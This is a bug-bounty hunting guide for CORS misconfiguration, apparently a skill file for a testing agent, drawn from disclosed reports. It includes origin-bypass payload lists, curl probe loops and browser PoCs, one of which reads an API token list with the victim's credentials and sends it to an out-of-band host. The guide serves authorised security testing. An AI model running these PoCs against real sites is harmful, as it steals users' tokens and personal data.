---
name: hunt-cors
description: "Hunting skill for CORS misconfiguration, built from 46 full disclosed bug-bounty reports (52-report corpus). Covers reflect-any-origin + credentials, null-origin trust, subdomain/trusted-origin regex bypass (prefix-only, missing end-anchor, unescaped dot, missing dot separator, substring-match), pre-flight (OPTIONS) gating, WordPress WP-JSON REST API reflection, cache-poisoning/DoS via Vary: Origin omission, WebSocket/SockJS/socket.io CORS, token/PII/CSRF-token theft, subdomain-takeover-assisted reads, and postMessage origin-check flaws. A finding pays High only when an attacker-controlled origin performs a CREDENTIALED cross-origin read of sensitive data and you prove the body is readable in a real browser. Use when testing API endpoints, SPAs, WordPress REST APIs, WebSocket handshakes, or any app emitting Access-Control-* headers."
sources: hackerone_public, portswigger_research, owasp, corben_io_research
report_count: 52
full_reports_read: 46
---

# HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration

## Crown Jewel Targets

CORS pays High **only** when an attacker-controlled origin can perform a
**credentialed** cross-origin read of sensitive authenticated data, and you
have a browser PoC proving the response body is readable from your origin.
The 46 full reports cluster hard around a few target classes — hunt these
first, in this order.

- **Reflect-any-origin + `Access-Control-Allow-Credentials: true`** — the
  server echoes the `Origin` header back in `ACAO` and sets `ACAC: true`, so
  any site can read authed API responses. This is the single most frequent
  High in the corpus: X/xAI account takeover [#426147], UPchieve
  [#1183601], U.S. DoD token disclosure [#733017], Semrush [#235200].
  Pattern to look for: `Access-Control-Allow-Origin: https://evil.com` +
  `Access-Control-Allow-Credentials: true` (verbatim from [#1194280],
  [#1188471], [#1530581]).

- **Sensitive-data endpoints behind a session** — anything returning PII,
  API tokens, CSRF tokens, subscription/account state, or admin usernames:
  `/api/user` ([#1183601]), `/api/token/list` ([#733017]),
  `/content-paywall/api/accesslevel` ([#769058]),
  `/~nordvpn/api/widget/v1/faqs` ([#796557]),
  `/wp-json/wp/v2/users/` ([#772744], [#1113759]). A readable `/api/health`
  is not High — the data must be sensitive (CSRF token theft → CSRF, API
  key theft → account abuse, admin-user enumeration → targeted attacks).

- **WordPress `/wp-json` REST API** — by far the most recurrent discovery
  surface in the pack. Reflected ACAO on `wp-json`, `wp-json/wp/v2/`,
  `wp-json/oembed/1.0/embed` appears in #591302, #921704, #1005374,
  #896093, #995144, #1194280, #1187543, #1188684, #1189363, #1188471,
  #1092125, #1707616, #1716286, #772744, #1113759. It often also exposes
  unauthenticated user lists (`id`, `name`, `login`) — enumerate first,
  then prove the cross-origin read.

- **Subdomain/trusted-origin regex bypass** — the CORS policy trusts
  `*.target.com` but the regex has a parsing flaw. Real corpus variants:
  missing dot (`notzomato.com`, [#168574]), prefix-with-no-anchor
  (`sifchain.finance.evil.com`, [#1192147], [#1188471]),
  substring match (`//niche.co` anywhere in Origin, [#426147]),
  suffix `.evil.com` (`hackers.upchieve.org.evil.com`, [#1404986]).
  The correct payload depends on which flaw (see Bypass Techniques).

- **Subdomain takeover → trusted origin** — a dangling subdomain that the
  CORS policy trusts. Myndr admin panel reflects any `*.myndr.net` with
  credentials, exposing CSRF nonces and session data ([#3930957]);
  `hackers.upchieve.org` origin-validation failure chains the same way
  ([#1404986]).

- **WebSocket / SockJS / socket.io CORS** — handshake/metadata endpoints
  reflecting arbitrary origins: `/ws/info` ([#417453]), `/socket.io/`
  ([#372452], [#311805]), `/sockjs/info` ([#163491]). SockJS/socket.io
  with `ACAO: *` is common and often Informational — but check whether
  `withCredentials` reads authed session state.

- **Cache-layer CORS + missing `Vary: Origin`** — reflected ACAO that gets
  cached and served to other users; can become cache poisoning / DoS.
  WordPress.com WP-JSON ([#591302], [#921704]) and Semrush ([#288912])
  explicitly note "Since the `Vary: Origin` header was not present ...
  reverse proxies and intermediate servers may cache it."

- **postMessage handlers with missing/loose `event.origin` checks** — a
  separate DOM-side class: verify `event.origin` against an allowlist
  *before* using `event.data`. Weak checks (`indexOf`, `endsWith`,
  `startsWith`, no check) are the entry.

- **`ACAO: *` on unauthenticated write endpoints** — usually Low, but a
  wildcard CORS on an unauthenticated state-changing endpoint is a real
  issue: file upload with wildcard + no rate limit ([#3765476]).

---

## Attack Surface Signals

**Header signals to grep for in every response:**

```
Access-Control-Allow-Origin: <reflected or *>      <- the core signal
Access-Control-Allow-Credentials: true             <- credentialed read possible
Access-Control-Allow-Methods: <...>                <- pre-flight method gating
Access-Control-Allow-Headers: <...>                <- pre-flight header gating
Access-Control-Expose-Headers: <...>               <- what JS can read
Vary: Origin                                       <- ABSENCE => cache-poison risk
```

**URL / endpoint patterns prioritized in the pack:**

```
/wp-json                         /wp-json/wp/v2/
/wp-json/wp/v2/users/            /wp-json/oembed/1.0/embed
/api/user                        /api/me
/api/token/list                  /api/account/settings
/content-paywall/api/accesslevel
/~nordvpn/api/widget/v1/faqs
/ws/info                         /socket.io/?EIO=3&transport=polling
/sockjs/info                     /piwik.php
/about  (generic HTML pages that still emit ACAO — #13551)
```

**Feature/tech signals** (mapped to the corpus frequency table below):

- **API endpoints** — 30 full reports; GET with an injected `Origin`, then
  an authenticated `Cookie`; look for `ACAC: true` and reflection.
- **Comment injection / cache layer / SSR** — reflected origin stored in a
  cached page (`comment-injection` 25, `cache-layer` 20). Check whether
  the reflected ACAO is cached across users.
- **Cookie handling / session attack** — 22 / 13 reports; you need a real
  session cookie to prove credentialed reads.
- **WebSocket upgrade / socket.io / SockJS** — test the handshake GET and
  `withCredentials` reads.
- **Admin/internal endpoints** — 8 reports; user lists and admin panels are
  frequent "sensitive but unauthenticated" reads.
- **Subdomain references in JS / public code search / JS source review** —
  find the CORS allowlist embedded in bundles or config; map trusted
  origins and look for takeover candidates.

**Two hard browser rules — check these FIRST (they kill most "findings"):**

- **`ACAO: *` CANNOT be combined with credentials.** If the server returns
  `ACAO: *`, the browser refuses to expose the body for a
  `credentials: include` request. A wildcard-only endpoint is NOT
  credential-exploitable — usually Informational/Low unless the data is
  sensitive without a session. (Corpus wildcard cases: [#13551],
  [#310579], [#163491], [#3765476] — none are High credentialed reads.)
- **`ACAC: true` is meaningless on its own.** It matters only if `ACAO`
  reflects/allows your specific attacker origin AND a cross-origin
  credentialed `fetch` actually returns a readable body. `ACAC` on a
  response that does not reflect your origin proves nothing.

If you cannot demonstrate a readable cross-origin authed body in a real
browser, you do not have a High. Do not submit header-diffing alone.

---

## Discovery Patterns From 46 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by how often the surface produced a real report in the corpus.
For each: **what to look for.**

1. **Burp HTTP history after logging in** — the most common starting point.
   *What to look for:* any API request carrying a session cookie; resend it
   in Repeater with `Origin: https://evil.com` and watch for a reflected
   `ACAO` + `ACAC: true`. Verbatim: "When you get login ucp.nordvpn.com then
   check burpsuite httphistory there you get this api endpoint" [#796557];
   "intercept the request to any path in the vulnerable asset" [#1404986];
   "intercept request using burp suite ... add Origin: evil.com to request"
   [#1005374].

2. **WordPress `/wp-json` and REST routes** — enumerate `/wp-json`,
   `/wp-json/wp/v2/`, `/wp-json/oembed/1.0/embed?url=...`.
   *What to look for:* reflected ACAO, plus unauthenticated user lists
   (`id/name/login`). Verbatim: "go to https://.../wp-json/wp/v2/" [#1005374];
   "Visit https://.../wp-json/, and you will see that it displays user IDs,
   names, login usernames" [#1092125]; "https://sifchain.finance/wp-json"
   [#1194280].

3. **OPTIONS / pre-flight probing** — send `OPTIONS` with an `Origin`.
   *What to look for:* reflected ACAO/ACAC and permissive
   `Allow-Methods`/`Allow-Headers`. Verbatim: "I detected the CORS
   vulnerability at the relevant address with the OPTIONS method" [#954512]
   (`OPTIONS /piwik.php?...` with `Origin: exploit.com`).

4. **Passive header scanning across many hosts** —
   `httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"`.
   *What to look for:* any host echoing the origin, including generic HTML
   pages ([#13551] `/about` with `ACAO: *`), version pages ([#310579]
   `ta.semrush.com/version/`), SockJS info ([#163491]).

5. **WebSocket handshake endpoints** — `/ws/info`, `/socket.io/`,
   `/sockjs/info`.
   *What to look for:* `ACAO` reflecting arbitrary origins; `withCredentials`
   reads of handshake/session state. Verbatim: "a number of instances on
   chatws25.stream.highwebmedia.com were the application accepts an
   arbitrarily supplied origin" [#417453].

6. **Signup / account-creation flows** — intercept the requests generated
   during signup.
   *What to look for:* reflection on paths that should not be CORS-enabled;
   also useful for registering an attacker origin. Verbatim: "I tried to
   sign up for an account, but it seems that the process is complicated"
   [#1404986]; "goto https://sifchain.finance/ website and enter email and
   click signup ... intercept via burp" [#1189363].

7. **Subdomain enumeration of the target** — list `*.target.com` and look
   for dangling/takeover candidates and permissive CORS on subdomains.
   *What to look for:* origin validation that trusts any `*.target.com`;
   subdomains reflecting ACAO with credentials ([#3930957], [#1404986],
   [#1716286] `trust.yelp.com`, [#1707616] `business.yelp.com`).

8. **JS source / public code search** — grep bundles and GitHub for the
   CORS allowlist or `Access-Control-Allow-Origin` config.
   *What to look for:* regexes that trust suffixes/prefixes, hardcoded
   origin lists with weak matching (tagged `js-source-review` and
   `public-code-search` in [#896093], [#1187543]).

9. **Known-ACAO vulnerability patterns** — test endpoints with a history of
   permissive CORS (analytics/piwik, oembed, admin user lists, token lists).
   *What to look for:* the same misconfiguration class across a fleet
   (many nearly identical reports from Sifchain, DoD, Semrush, Yelp).

### Feature-Based Discovery Signals (frequency-ranked)

Counts are the number of the 46 full reports whose text contains the
signal. "Why it matters / what to probe" maps each to a concrete test.
(Extracted verbatim from the pack's frequency table.)

| Rank | Signal | Reports | Why it matters / what to probe |
|---|---|---|---|
| 1 | cors-misconfig | 46 | The primary vulnerability class in every report. Probe every response with an injected `Origin` for `ACAO` reflection and `ACAC: true`. |
| 2 | misconfiguration | 37 | Generic policy misconfig — whitelist too broad or absent. Probe what origins/methods/headers are accepted. |
| 3 | api-endpoint | 30 | APIs are the data-bearing sinks. Probe with a session cookie: `/api/user`, `/api/token/list`, `/api/me`. |
| 4 | comment-injection | 25 | Reflected origin can be stored in cached comment/render output. Probe whether ACAO is persisted and served to other users. |
| 5 | image-processing | 23 | Image/thumbnail render endpoints emit ACAO and touch sessions. Probe with `Origin` + authenticated context. |
| 6 | cookie-handling | 22 | Credentialed reads require cookies. Probe with/without `Cookie` to confirm ACAO+ACAC on authed responses. |
| 7 | cache-layer | 20 | Reflected ACAO + missing `Vary: Origin` => cache poisoning/DoS. Probe cache headers and cross-user served headers ([#591302], [#288912]). |
| 8 | dom-based | 19 | postMessage / DOM-side origin checks. Probe message handlers for weak `event.origin` validation. |
| 9 | xml-parser | 19 | XML/oembed endpoints (`format=xml`) reflect origin. Probe `/wp-json/oembed/1.0/embed?...&format=xml` ([#1187543]). |
| 10 | filter-bypass | 15 | Origin filters with flaws. Probe prefix/suffix/char tricks (`{`, `}`, backtick) ([#975983]). |
| 11 | server-side-rendering | 14 | SSR pages reflect ACAO in HTML. Probe generic pages, not just `/api/*` ([#13551]). |
| 12 | search-filter-sort | 14 | Search endpoints reflect origin in JSON results. Probe query-driven APIs ([#896093]). |
| 13 | url-fetching | 13 | URL-driven fetches echo origin. Probe `?url=` oembed-style params ([#1187543]). |
| 14 | session-attack | 13 | Session theft is the impact. Prove readable authed body ([#1716286]). |
| 15 | json-body | 12 | JSON responses with reflected ACAO. Probe `Accept: application/json` endpoints ([#769058]). |
| 16 | csrf | 12 | CORS + CSRF chain: stolen CSRF tokens or cross-origin writes ([#975983], [#867436]). |
| 17 | proxy-feature | 11 | Proxying through a browser bypasses IP controls ([#235200]). Probe internal/admin endpoints via victim browser. |
| 18 | subdomain | 10 | Trusted-subdomain regex flaws. Probe `evil.target.com`, `target.com.evil.com`, `nottarget.com` ([#168574], [#1404986]). |
| 19 | redirect-handling | 10 | Origin reflection across redirects; check final-hop ACAO ([#896093]). |
| 20 | admin-internal | 8 | Admin/user-list reads are high-signal sensitive data ([#772744], [#1113759]). |
| 21 | public-code-search | 5 | Find allowlists/config in public repos ([#896093]). |
| 22 | subdomain-takeover | 4 | Take over a trusted subdomain and host PoC there ([#3930957], [#1404986]). |
| 23 | js-source-review | 4 | Extract exact regex from bundles ([#1187543]). |
| 24 | websocket | 4 | WS handshake CORS ([#417453], [#372452], [#311805], [#163491]). |
| 25 | stack-fingerprinting | 3 | Fingerprint stack (WordPress, Cloudflare) to pick known payloads ([#1716286], [#1199527]). |
| 26 | brute-otp-reset | 3 | Wildcard CORS on unauth write endpoints ([#3765476]). |
| 27 | dos-resource | 2 | Cache-poisoned ACAO => DoS ([#591302]). |
| 28 | sso-oauth | 2 | OAuth/SSO flows with CORS origin-validation failure ([#235200], [#1188471]). |
| 29 | internal-network | 2 | Browser-proxy to internal resources ([#958459], [#975983]). |
| 30 | cloud-metadata | 2 | Indirect tag only — CORS reports mentioning cloud-hosted targets ([#769058], [#426165]). |

Lower-frequency tags in the corpus (`reflected`, `stored`, `double-encoding`,
`debug-error-leak`, `host-header`, `svg-upload`, `file-upload`,
`mutation-polyglot`, `template-injection`) each appear in one or two reports
and flag specialized angles: origin reflection ([#1404986]), stored XSS +
CORS ([#1188471]), double-encoded origins ([#235200]), server-version leak
in OPTIONS ([#954512]), Host-header/SOP bypass and CSRF-token exposure
([#867436]), and wildcard CORS on unauthenticated file upload ([#3765476]).
These are worth a targeted check when the primary signals above are absent. |

### Verbatim Discovery Clues

Eighteen real "how I found it" quotes, all verbatim from disclosed report
text. The first eleven are from the dedicated discovery-clue set; the rest
are verbatim discovery statements from the report excerpts.

1. [#975983] "However, I discovered that regex logic for checking `Referer` header is flawed."
2. [#975983] "I found that adding `{` or `}` at the end of the domain pass the validation."
3. [#417453] "Hi, i was able to discover a number of instances on chatws25."
4. [#417453] "The application allowed access from the requested origin https://vazeeukllvua."
5. [#163491] "You found Access-Control-Allow-Origin: * ."
6. [#1189363] "i found a cors bug in your https://sifchain."
7. [#1404986] "I tried to sign up for an account, but it seems that the process is complicated, and I also don't live in the US."
8. [#288912] "The application allowed access from the requested origin https://hhgdhgjgbrg."
9. [#867436] "I found a bug on your website that let me bypass the SOP policy."
10. [#867436] "I also found a link that expose the csrf-token on the URL and you should check this link in the black."
11. [#954512] "In my tests, I found the relevant vulnerability using different methods."
12. [#426147] "Basically, the application was only checking whether \"//niche.co\" was in the Origin header, that means i can give anything containing that."
13. [#772744] "the following endpoint https://lonestarcell.com/wp-json/wp/v2/users/ has an unsafe sharing of sensitive information of admin usernames"
14. [#1404986] "I found that https://hackers.upchieve.org/ is using cross-origin resource sharing in an insecure way."
15. [#1194280] "CORS misconfiguration is found on https://sifchain.finance/wp-json as \"Access-Control-Allow-Origin\" is dynamically fetched from client Origin header with \"Credentials\" set as true."
16. [#954512] "I detected the CORS vulnerability at the relevant address with the OPTIONS method."
17. [#796557] "When you get login ucp.nordvpn.com then check burpsuite httphistory there you get this api endpoint."
18. [#733017] "Upon accessing the site we discover two specific response headers which indicates that a cross-domain request for sensitive information might be possible"

### Probe Checklist (15 concrete probes)

Run these in order; each maps to a corpus-proven signal.

1. **Reflect-any-origin:** `Origin: https://evil.com` → look for `ACAO:
   https://evil.com` + `ACAC: true` (the High case, [#1194280]).
2. **Null origin:** `Origin: null` → look for `ACAO: null` + `ACAC: true`;
   a sandbox iframe emits `Origin: null`.
3. **Wildcard check:** `Origin: https://evil.com` with `ACAO: *` → note but
   NOT credential-exploitable ([#13551], [#310579]).
4. **ACAC-alone check:** confirm whether `ACAC: true` appears when origin is
   NOT reflected — proves nothing on its own.
5. **HTTP (insecure) trusted origin:** `Origin: http://sub.target.com` →
   reflection with `ACAC: true` means MITM can read (plaintext scheme is the flaw).
6. **Subdomain suffix bypass:** `Origin: https://eviltarget.com` → tests a
   missing-dot regex (`.*target.com$`) ([#168574]).
7. **Missing end-anchor bypass:** `Origin: https://x.target.com.evil.com` →
   tests unanchored regex ([#1404986]).
8. **Prefix-only bypass:** `Origin: https://target.com.evil.com` → tests
   `^https?://target\.com` with no `$` ([#1192147], [#1188471]).
9. **Substring match:** `Origin: https://niche.co.evil.net` → tests a
   `//niche.co` substring check ([#426147]).
10. **Special-char origin:** `Origin: https://target.com{.evil.com` or with
    `}`/backtick — Safari loads weird chars ([#975983]).
11. **Pre-flight OPTIONS:** `OPTIONS /api/account/email` with
    `Access-Control-Request-Method: PUT` and
    `Access-Control-Request-Headers: x-custom-auth` → check reflected
    methods/headers ([#954512]).
12. **Sensitive-path read:** send the authed cookie to `/api/token/list`,
    `/api/user`, `/wp-json/wp/v2/users/` → confirm a sensitive body exists
    ([#733017], [#1183601], [#772744]).
13. **Cache header check:** look for absence of `Vary: Origin` on reflected
    ACAO → cache poisoning/DoS ([#591302], [#921704], [#288912]).
14. **WebSocket handshake:** GET `/ws/info` or `/socket.io/` with an `Origin`
    → reflected ACAO on a session-bearing transport ([#417453], [#372452]).
15. **Browser PoC:** load the read PoC from your attacker origin while
    logged in → confirm the body is readable (curl is not proof).

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover CORS-emitting endpoints

```bash
# Probe with GET (not -I): some servers emit CORS only on GET, not HEAD.
while read url; do
  result=$(curl -s -D - -o /dev/null "$url" \
    -H "Origin: https://evil.com" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  [ -n "$result" ] && echo "=== $url ===" && echo "$result"
done < recon/$TARGET/api-endpoints.txt

# httpx bulk check across live hosts
cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"

# Always include WordPress REST routes in the list
for p in /wp-json /wp-json/wp/v2/ /wp-json/wp/v2/users/ \
         /wp-json/oembed/1.0/embed?url=https://$TARGET/\&format=xml; do
  curl -s -D - -o /dev/null "https://$TARGET$p" \
    -H "Origin: https://evil.com" | grep -i "access-control"
done
```

Record every endpoint emitting `Access-Control-*`; note the stack (WordPress,
Cloudflare, socket.io) to pick the right payload class.

### Phase 2 — Reflect-any-origin + null origin

```bash
# Does the server reflect an arbitrary Origin back?
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Vulnerable (the High case):
#   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
#   Access-Control-Allow-Credentials: true          <- + credentials => readable
#
# NOT exploitable for credentialed theft:
#   Access-Control-Allow-Origin: *                   <- browser blocks creds read
#   (no ACAC, or ACAC absent)                        <- not credentialed

# Null-origin trust
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: null" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
# Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
```

Reflection is often dynamic ("dynamically fetched from client Origin header
with Credentials set as true" — [#1194280]); scheme-swapping input also passes
weak checks ([#426147]).

### Phase 3 — Subdomain / trusted-origin regex bypass

Identify the regex class FIRST, then send the matching payload. Getting
this wrong wastes the test and produces false negatives. The corpus gives
real examples of each class.

| Server logic (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Real example |
|---|---|---|---|
| `^https?://.*\.target\.com$` | None — escaped dot + end-anchor. Correct. | (no simple bypass) | Move on or look for subdomain takeover. |
| `endswith("target.com")` with no dot | Missing dot separator | `https://eviltarget.com` | [#168574] `notzomato.com` |
| `^https?://.*\.target\.com` | Missing end-anchor `$` | `https://x.target.com.evil.com` | [#1404986] `hackers.upchieve.org.evil.com` |
| `^https?://target\.com` | Prefix-only, no `$` | `https://target.com.evil.com` | [#1192147], [#1188471] `sifchain.finance.evil.com` |
| substring `"//niche.co" in origin` | Substring match, no structure | `https://niche.co.evil.net` | [#426147] |
| `Referer` regex + Safari weird chars | Special chars accepted | `https://target.com{.evil.com`, `}` | [#975983] |

```bash
for ORIGIN in \
  "https://evil.target.com" \
  "https://eviltarget.com" \
  "https://x.target.com.evil.com" \
  "https://target.com.evil.com" \
  "https://niche.co.evil.net" \
  "https://target.com%60.evil.com" \
  "https://target.com{.evil.com" \
  "http://target.com"; do
  RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
done
```

A bypass is real only if the server reflects **your registerable origin**
into `ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a
bug unless you can actually control a `*.target.com` host (then see
Phase 6 / hunt-subdomain).

### Phase 3b — Trusted insecure (HTTP) origin

If ACAO reflects/allows any `http://` origin (even a correctly-anchored
in-scope one) with `ACAC:true`, a network attacker on that cleartext host
injects a page that reads the authed cross-origin body — no regex flaw
needed, the plaintext scheme IS the flaw.

```bash
curl -s -D- -o/dev/null "https://$TARGET/api/me" \
  -H "Origin: http://sub.$TARGET" -H "Cookie: $SESSION" | grep -i access-control
```

Real only if a MITM can occupy that HTTP origin (no HSTS-preload). Pair
with `hunt-tls-network`.

### Phase 4 — Pre-flight (OPTIONS) gating bypass

Non-simple requests (custom headers, `PUT`/`DELETE`/`PATCH`, non-simple
`Content-Type`) trigger a CORS **pre-flight** `OPTIONS`. Two things to test:

1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**

```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
  | grep -i "access-control"
# Vulnerable: ACAO reflects evil.com + ACAC:true +
#   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
# => attacker origin can issue authed PUT/DELETE with custom headers.
```

2. **Is the pre-flight even enforced server-side?** Some servers reflect the
   origin on `OPTIONS` but the actual GET/POST also reflects — the read path
   is the bug; the pre-flight just confirms write-path reach. Test GET/POST
   directly too — never assume the pre-flight result equals the real-request
   result. Confirm in a browser, because curl ignores CORS entirely.

### Phase 5 — Browser PoCs (the only thing that proves impact)

curl does NOT enforce CORS — it will happily show a reflected header even
when a browser would block the read. **Every CORS High needs a browser PoC.**

**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):

```html
<!doctype html><body><pre id="out"></pre>
<script>
fetch("https://TARGET/api/me", {credentials: "include"})
  .then(r => r.text())
  .then(d => {
    document.getElementById("out").innerText = d;        // prove readable body
    // OOB proof: fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d));
  })
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```

`BLOCKED` / TypeError means the browser refused the read — not a valid finding
regardless of what curl showed (the `ACAO: *` + creds case).

**5b. Null-origin read** — a `sandbox` iframe sends `Origin: null`. The inner
document must lack `allow-same-origin` so its origin is opaque (`null`):

```html
<!doctype html><body>
<iframe sandbox="allow-scripts" srcdoc='
  <script>
    fetch("https://TARGET/api/me", {credentials: "include"})
      .then(r => r.text())
      .then(d => parent.postMessage(d, "*"));
  &lt;/script&gt;'></iframe>
<script>
window.addEventListener("message", e => {
  // d is the authed body, read cross-origin via a null Origin
  // fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(e.data));
  console.log("NULL-ORIGIN READ:", e.data);
});
</script></body>
```

**5c. Trusted-subdomain read** — once you control a host the regex trusts
(real takeover, or a registerable origin matching a buggy regex from
Phase 3), host 5a there. The reflected origin is now one you legitimately
serve, so the browser allows the read. Myndr's admin panel is the model:
any `*.myndr.net` origin reflects with credentials, exposing CSRF nonces
([#3930957]).

### Phase 6 — postMessage origin check

```bash
grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
  | grep -v "\.origin"
# Then audit each hit: does it check event.origin against an allowlist
# BEFORE using event.data? Weak checks to flag:
#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
#   .endsWith("target.com")          <- "eviltarget.com" passes
#   startsWith("https://target")     <- "https://target.evil.com" passes
#   no check at all
```

postMessage is a DOM-side sibling of HTTP CORS (XSS / client auth bypass);
see hunt-dom.

### Phase 7 — Cache-poisoning / DoS angle

If reflected ACAO is cached without `Vary: Origin`, the poisoned header is
served to others — WordPress.com WP-JSON ([#591302], [#921704]) and Semrush
([#288912]) turned this into DoS. Check `Cache-Control`, `Vary`, and whether a
second user receives your origin.

---

## Payload & Detection Patterns

### Reflection / credential check (curl — triage only)

```bash
# Reflect-any-origin + credentials
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: https://evil.com" -H "Cookie: $SESSION_COOKIE" | grep -i access-control

# Null-origin
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: null" -H "Cookie: $SESSION_COOKIE" | grep -i access-control

# OPTIONS pre-flight
curl -s -D - -o /dev/null -X OPTIONS https://$TARGET/api/account/email \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" | grep -i access-control
```

### Subdomain / trusted-origin payload set

```
https://evil.target.com          # in-scope subdomain (not a bug alone)
https://eviltarget.com           # missing-dot regex bypass
https://x.target.com.evil.com    # missing end-anchor bypass
https://target.com.evil.com      # prefix-only bypass
https://niche.co.evil.net        # substring match bypass (//niche.co)
https://hackers.upchieve.org.evil.com   # observed reflected origin (#1404986)
https://sifchain.finance.evil.com       # observed reflected origin (#1192147)
https://target.com%60.evil.com   # backtick/underscore parser quirk
https://target.com{.evil.com     # Safari weird-char bypass (#975983)
http://sub.target.com            # trusted insecure HTTP origin
```

### Sensitive-data read PoC (the actual exploit)

```html
<!-- Reflect-any-origin credentialed read; exfil with unique marker -->
<!doctype html><body><pre id="out"></pre>
<script>
const MARK = "poc-<unique>";
fetch("https://TARGET/api/token/list", {credentials: "include"})
  .then(r => r.text())
  .then(d => {
    document.getElementById("out").innerText = d;
    fetch("https://OOB-ID.oastify.com/?m=" + MARK + "&d=" + encodeURIComponent(d));
  })
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```

Corpus PoCs read `/api/token/list` ([#733017]), `/api/user` ([#1183601]),
`/wp-json/wp/v2/users/` ([#772744]), then exfil the body to the attacker.

### WebSocket / socket.io CORS probe

```
GET /ws/info HTTP/1.1
Host: chatws25.stream.highwebmedia.com
Origin: https://vazeeukllvua.com
# -> ACAO: https://vazeeukllvua.com  ([#417453])

GET /socket.io/?EIO=3&transport=polling&t=... HTTP/1.1
xhr.withCredentials = true;   ([#372452], [#311805])

GET /sockjs/info?cb=...   -> ACAO: *  ([#163491])
```

### WordPress WP-JSON enumeration + cache check

```bash
for p in /wp-json /wp-json/wp/v2/ /wp-json/wp/v2/users/ \
         "/wp-json/oembed/1.0/embed?url=https://$TARGET/&format=xml"; do
  echo "=== $p ==="
  curl -s -D - -o /dev/null "https://$TARGET$p" -H "Origin: https://evil.com" \
    | grep -iE "access-control|vary|cache-control|link"
done
# Sensitive user-list probe (often unauthenticated)
curl -s "https://$TARGET/wp-json/wp/v2/users/" | jq '.[].name' 2>/dev/null | head
```

### Automation (triage only — never the proof)

```bash
pip3 install corsy
corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"
nuclei -u https://$TARGET -t http/misconfiguration/cors/
# Burp: passively flags origin reflection; always re-confirm in a real browser.
```

Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.

---

## Common Root Causes

1. **Dynamic origin reflection without a whitelist** — the app copies
   `Origin` into `ACAO` and sets `ACAC: true`: "dynamically fetched from
   client Origin header with Credentials set as true" ([#1194280],
   [#1188471], [#1189363]). Fix = strict server-side origin allowlist.

2. **Weak suffix / prefix / substring checks** — trust decided by
   `endswith("target.com")`, `startswith("https://target")`, or
   `"//niche.co" in origin` instead of an exact dot-boundary match.
   Produced `notzomato.com` ([#168574]), `sifchain.finance.evil.com`
   ([#1192147]), `niche.co.evil.net` ([#426147]).

3. **Origin validation failure** — "fails to properly validate the Origin
   header and returns ACAC: true" ([#1404986], [#1188471], [#1192147]);
   the check is absent or misapplied to the response path.

4. **Referer/regex flaws + no defense-in-depth** — flawed `Referer` regex
   ([#975983]) plus "no other protective mechanisms in place (SameSite
   flag, Origin check, Content-Type check)" → site-wide CSRF.

5. **Missing `Vary: Origin` on reflected ACAO** — caches store one user's
   origin and serve it to others → cache poisoning / DoS ([#591302],
   [#921704], [#288912]).

6. **Default-framework permissiveness** — WordPress REST API, socket.io,
   SockJS, analytics endpoints ship permissive CORS never tightened
   ([#13551], [#163491], [#372452], many `/wp-json` reports).

7. **Trusting insecure HTTP origins** — `http://` allowlist entries let a
   network MITM read authed data (Phase 3b; cf. [#975983]).

8. **Wildcard CORS on state-changing endpoints** — `ACAO: *` + unauthenticated
   writes (file upload) lets any site drive the endpoint ([#3765476]).

9. **Subdomain trust without takeover defense** — policy trusts all
   `*.target.com`; a dangling subdomain can host the PoC ([#3930957],
   [#1404986]).

---

## Bypass Techniques

### Subdomain-regex bypasses (match the flaw to the payload)

- **Missing dot separator** — `.*target\.com$` (no `\.`) matches
  `eviltarget.com`: "all domains ending in zomato.com including notzomato.com"
  ([#168574]).
- **Missing end-anchor `$`** — `^https?://.*\.target\.com` matches a prefix;
  `hackers.upchieve.org.evil.com` reflected ([#1404986]).
- **Prefix-only** — `^https?://target\.com` with no `$` →
  `sifchain.finance.evil.com` reflected + creds ([#1192147], [#1188471]).
- **Substring match** — `//niche.co` *in* Origin → `niche.co.evil.net`;
  protocol swaps (`http`, `ftp`, `file`) pass ([#426147]).
- **Unescaped dot** — `.*.target.com$` where `.` is "any char" widens the match.
- **Special characters** — `{`, `}` after the domain pass a flawed `Referer`
  regex; Safari loads them, Chrome does not ([#975983]). Also backtick:
  `https://target.com%60.evil.com`. Confirm the browser sends the origin.

### Null-origin bypass

Force `Origin: null` via a `sandbox` iframe (no `allow-same-origin`), a
`data:`/`blob:` document, or a cross-scheme 302 chain. If trusted with
`ACAC: true`, any page reads authed data (PoC 5b).

